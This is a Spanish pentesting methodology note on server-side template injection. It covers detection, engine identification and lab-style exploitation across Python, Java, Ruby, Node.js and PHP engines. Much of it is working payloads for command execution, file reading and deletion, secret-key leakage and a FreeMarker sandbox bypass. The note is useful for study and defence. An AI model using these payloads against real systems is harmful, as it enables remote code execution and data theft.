---
tags:
  - web
  - security
  - ssti
  - rce
  - offensive
  - methodology
---
## Índice de Contenidos
- [[#🧠 Concepto Core Contexto vs Concatenación|Concepto Core]]
- [[#🕵️‍♂️ Metodología de Detección e Identificación|Metodología de Detección]]
	- [[#1. Detección (Fase de Fuzzing)]]
	- [[#2. Identificación del Motor (Decision Tree)]]
- [[#🧨 Explotación por Tecnologías Deep Dive|Explotación por Tecnologías]]
	- [[#🐍 Python Jinja2, Tornado, Django|Python (Tornado/Django)]]
	- [[#☕ Java FreeMarker, Velocity|Java (FreeMarker)]]
	- [[#💎 Ruby ERB - Embedded Ruby|Ruby (ERB)]]
	- [[#📜 JavaScript Node js Handlebars|JavaScript (Handlebars)]]
	- [[#🐘 PHP Custom Logic & Object Injection|PHP (Lógica de Objetos)]]
- [[#🛠️ Herramientas y Recursos|Herramientas y Recursos]]
	- [[#Cheatsheet de Fuzzing (Para Intruder/Burp)]]
	- [[#Tabla Resumen de Motores]]
- [[#Referencias y recursos]]

---

> [!SUMMARY] Definición Profesional
> **Server-Side Template Injection (SSTI)** ocurre cuando una aplicación web incrusta **input del usuario** de manera insegura dentro de una plantilla (template) antes de renderizarla en el servidor.
> 
> A diferencia del XSS (que ocurre en el cliente), el SSTI permite al atacante manipular el **motor de plantillas**. Esto a menudo deriva en la ejecución de código en el servidor (**RCE**), lectura de archivos internos o acceso a objetos sensibles de la aplicación.

---
## 🧠 Concepto Core: Contexto vs. Concatenación

El error fundamental de los desarrolladores es concatenar strings en lugar de pasar variables al motor.

**❌ Código Vulnerable (Concatenación):**
```python
# El input se evalúa COMO PARTE del código de la plantilla
template = "Hola " + usuario_input + ", bienvenido."
render(template)
````

_Si el usuario envía `{{7*7}}`, el motor recibe `Hola {{7*7}}...` y lo procesa._

**✅ Código Seguro (Paso de parámetros):**

```Python
# El input se trata SOLO como datos
template = "Hola {{ nombre }}, bienvenido."
render(template, nombre=usuario_input)
```

---
## 🕵️‍♂️ Metodología de Detección e Identificación

El proceso de pentesting para SSTI sigue tres fases: **Detectar**, **Identificar** y **Explotar**.

### 1. Detección (Fase de Fuzzing)

No basta con probar `<script>alert(1)</script>`. Debemos enviar operaciones matemáticas o lógicas que el servidor ejecute.

> [!TIP] El Payload Políglota
> 
> Usa este payload para disparar errores o confirmaciones en múltiples motores a la vez:
> 
> `${{<%[%'"}}%\`

**Pruebas básicas matemáticas:**

| **Payload**  | **Resultado esperado (Vulnerable)** | **Motor probable**           |
| ------------ | ----------------------------------- | ---------------------------- |
| `{{7*7}}`    | `49`                                | Jinja2, Twig, Nunjucks       |
| `${7*7}`     | `49`                                | FreeMarker, Velocity, Spring |
| `<%= 7*7 %>` | `49`                                | ERB (Ruby), EJS              |
| `#{7*7}`     | `49`                                | Jade / Pug                   |
| `*{7*7}`     | `49`                                | Smarty (versiones antiguas)  |

### 2. Identificación del Motor (Decision Tree)

Una vez confirmada la inyección, debemos saber qué tecnología corre detrás. Usa este árbol de decisión mental:

Fragmento de código

```
graph TD
    A [Inyección {{7*7}}] -->|49| 
    B {¿Qué devuelve {{7*'7'}}?}
    B -->|49| C[Posible Twig / Jinja2]
    B -->|7777777| D[Posible Jinja2 / Python]
    A -->|{{7*7}}| E{Prueba ${7*7}}
    E -->|49| F[Java Freemarker / Velocity]
    F -->|Prueba con error| G[Forzar Traceback]
```

> [!INFO] Truco de Profesional: Forzar el Error
> 
> A menudo, la mejor forma de identificar el motor no es un payload exitoso, sino uno fallido.
> 
> **Ejemplo:** Enviar `<%= foobar %>` en un entorno Java provocará un error gigante.
> 
> _Busca en el stack trace palabras clave:_ `freemarker`, `django`, `werkzeug`, `handlebars`.

---

## 🧨 Explotación por Tecnologías (Deep Dive)

### 🐍 Python (Jinja2, Tornado, Django)

En Python, el objetivo es escapar del entorno restringido (sandbox) accediendo a las clases base de Python (`object`) para luego bajar a `os` o `subprocess`.

#### Concepto: Introspección MRO

Usamos `__mro__` (Method Resolution Order) o `__bases__` para subir en la jerarquía de objetos hasta encontrar una clase que nos permita ejecutar comandos.

**Tabla de Payloads Python:**

|**Objetivo**|**Payload (Jinja2 / Tornado)**|
|---|---|
|**Detectar**|`{{7*7}}` o `{{config}}`|
|**RCE Básico**|`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`|
|**Leer Archivo**|`{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}`|

> [!EXAMPLE] Caso Real: Tornado Template
> 
> **Contexto:** SSTI básica en contexto de código.
> 
> **Vía:** `POST /my-account/change-blog-post-author-display`
> 
> **Payload Explicado:**
> 
> HTTP
> 
> ```
> blog-post-author-display=user.name}}{%import os%}{{os.system('rm /home/carlos/morale.txt')}}
> ```
> 
> 1. `user.name}}`: Cerramos la expresión anterior válida.
>     
> 2. `{%import os%}`: Tornado permite importar módulos directamente en la plantilla.
>     
> 3. `{{os.system(...)}}`: Ejecutamos comando del sistema.
>     

> [!EXAMPLE] Caso Real: Django (Info Disclosure)
> 
> **Contexto:** Filtrado de información vía objetos del usuario. Primero forzamos error (división por cero) para ver el motor.
> 
> **Payload:**
> 
> Python
> 
> ```
> <p>{{settings.SECRET_KEY}}.</p>
> ```
> 
> **Resultado:** Obtenemos la llave secreta de Django, crítica para firmar cookies de sesión.

---

### ☕ Java (FreeMarker, Velocity)

Java es estricto, pero FreeMarker tiene una utilidad llamada `Execute` que es devastadora si está habilitada.

**Tabla de Payloads FreeMarker:**

|**Objetivo**|**Payload**|**Explicación**|
|---|---|---|
|**Detectar**|`${7*7}`|Devuelve 49.|
|**RCE (Documentado)**|`<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }`|Instancia la clase Execute utilitaria.|

> [!EXAMPLE] Caso Real: FreeMarker Básico
> 
> **Contexto:** Uso de documentación oficial del motor.
> 
> **Payload:**
> 
> Java
> 
> ```
> <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm /home/carlos/morale.txt")}
> ```

#### Sandbox Bypass en Java (Análisis Avanzado)

Cuando `Execute` o `new()` están bloqueados, debemos usar la reflexión de Java a través de objetos expuestos.

> [!EXAMPLE] Caso Real: FreeMarker Sandbox Bypass
> 
> **Contexto:** ¿Cómo sé que hay sandbox? Porque el payload básico anterior falla o devuelve error de permisos.
> 
> **Payload:**
> 
> Java
> 
> ```
> <#assign classloader=product.class.protectionDomain.classLoader>
> <#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
> <#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
> <#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
> ${dwf.newInstance(ec,null)("cat my_password.txt")}
> ```
> 
> **Análisis Técnico:**
> 
> 1. **Entrada (`product`):** Usamos un objeto existente en la plantilla.
>     
> 2. **Escalada (`protectionDomain`):** Accedemos al ClassLoader (el cerrajero de Java).
>     
> 3. **Carga (`loadClass`):** Cargamos manualmente la clase `Execute` prohibida.
>     
> 4. **Ejecución (`newInstance`):** Instanciamos y ejecutamos.
>     

---

### 💎 Ruby (ERB - Embedded Ruby)

Común en aplicaciones Rails. Es muy directo porque ERB permite ejecución de código arbitrario de Ruby dentro de los tags `<%= %>`.

| **Objetivo**       | **Payload**                                       |
| ------------------ | ------------------------------------------------- |
| **RCE Directo**    | `<%= system('ls') %>` (Devuelve true/false)       |
| **RCE con Salida** | ```<%=` ls -la `%>``` (Backticks capturan output) |

> [!EXAMPLE] Caso Real: ERB Template
> 
> **Contexto:** SSTI básica en parámetro GET.
> 
> **Payload en URL:**
> 
> ```
> [https://target.net/?message=](https://target.net/?message=)<%= system('rm /home/carlos/morale.txt') %>
> ```

---

### 📜 JavaScript / Node.js (Handlebars)

Handlebars es **"Logic-less"** (sin lógica). Por diseño, NO permite ejecutar código (`{{ exec(...) }}` no existe). Debemos usar **Prototype Pollution** o abusar de funciones internas.

> [!EXAMPLE] Caso Real: Handlebars Exploit
> 
> **Contexto:** Lenguaje desconocido. Identificado provocando error para ver el stack trace.
> 
> **Payload (Explicado):**
> 
> Este payload es monstruoso porque Handlebars no permite `require` directo. Debemos "construir" el código inyectándolo en el compilador.
> 
> Handlebars
> 
> ```
> {{#with "s" as |string|}}
>   {{#with "e"}}
>     {{#with split as |conslist|}}
>       {{this.pop}}
>       {{this.push (lookup string.sub "constructor")}}
>       {{this.pop}}
>       {{#with string.split as |codelist|}}
>         {{this.pop}}
>         {{this.push "return require('child_process').execSync('ls -la');"}}
>         {{this.pop}}
>         {{#each conslist}}
>           {{#with (string.sub.apply 0 codelist)}}
>             {{this}}
>           {{/with}}
>         {{/each}}
>       {{/with}}
>     {{/with}}
>   {{/with}}
> {{/with}}
> ```
> 
> **Lógica:**
> 
> 1. Accede al `constructor` de String.
>     
> 2. Manipula el array `conslist` interno de la plantilla.
>     
> 3. Inyecta código JS puro (`require('child_process')`).
>     
> 4. Fuerza al motor a compilar y ejecutar esa nueva función.
>     

---

### 🐘 PHP (Custom Logic & Object Injection)

PHP suele ser vulnerable no solo por `eval()`, sino por exponer objetos con métodos `public`.

> [!DANGER] Invocación de Métodos Arbitrarios
> 
> Si tienes acceso a un objeto `$user`, puedes llamar a **cualquier** método público definido en su clase, aunque no esté pensado para la plantilla.

> [!EXAMPLE] Caso Real: Inyección en Objeto Usuario (Lab Avanzado)
> 
> **Objetivo:** RCE o borrado de archivos arbitrario abusando de la lógica de la aplicación.
> 
> **Fase 1: Discovery**
> 
> Subimos un archivo inválido para forzar error. El Stack Trace revela:
> 
> - Archivo: `/home/carlos/User.php`
>     
> - Método interno: `User->setAvatar($path, $type)`
>     
> 
> **Fase 2: Explotación (Setting Avatar)**
> 
> Inyectamos una llamada al método descubierto para cambiar nuestro avatar a un archivo del sistema (código fuente).
> 
> HTTP
> 
> ```
> blog-post-author-display=user.setAvatar('/home/carlos/User.php','image/jpg')
> ```
> 
> _Ahora, al ver nuestra imagen de perfil, vemos el código PHP del servidor._
> 
> **Fase 3: Análisis de Código y Escalada**
> 
> Leyendo el código (`User.php`), encontramos:
> 
> PHP
> 
> ```
> public function gdprDelete() {
>    $this->rm(readlink($this->avatarLink));
>    $this->rm($this->avatarLink);
>    $this->delete();
> }
> ```
> 
> **Fase 4: Ejecución Final**
> 
> Llamamos a esa función para borrar un archivo objetivo.
> 
> HTTP
> 
> ```
> blog-post-author-display=user.gdprDelete()
> ```

---

## 🛠️ Herramientas y Recursos

### Cheatsheet de Fuzzing (Para Intruder/Burp)

Carga esto en tu lista de palabras:

Plaintext

```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
{{self}}
{{_self}}
{{config}}
{{settings}}
<#assign x=1>
```

### Tabla Resumen de Motores

|**Lenguaje**|**Motor**|**Sintaxis Típica**|**Payload Crítico (RCE)**|
|---|---|---|---|
|**Python**|Jinja2|`{{ }}`|`{{ self.__init__... }}`|
|**Python**|Tornado|`{{ }}`|`{% import os %}{{os.system()}}`|
|**Java**|FreeMarker|`${ }`|`new("freemarker.template.utility.Execute")`|
|**Java**|Velocity|`${ }`|`$class.inspect("java.lang.Runtime")...`|
|**Ruby**|ERB|`<%= %>`|`<%= system('id') %>`|
|**JS**|Handlebars|`{{ }}`|_Requiere exploit complejo (ver arriba)_|
|**PHP**|Twig|`{{ }}`|`{{_self.env.registerUndefinedFilterCallback("exec")}}`|

## Referencias y recursos

- **[PayloadsAllTheThings (SSTI)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)**
    
- **[HackTricks (SSTI)](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html?highlight=ssti):** Para técnicas de bypass específicas.